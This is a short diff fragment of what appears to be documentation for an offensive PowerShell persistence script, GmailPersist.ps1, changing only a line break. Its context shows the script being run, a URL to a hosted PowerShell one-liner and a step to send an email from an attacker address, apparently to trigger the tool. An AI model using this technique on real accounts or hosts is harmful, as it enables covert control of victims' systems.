@@ -16,7 +16,7 @@ http://172.16.0.1/powershell-oneliner.txt
 <h4>EXAMPLE</h4>
 ```
 PS> ./GmailPersist.ps1
-```
+```<br>
 Now send and email with the following information:<ul>
 
 <li>FROM: (ATTACKER EMAIL)</li>
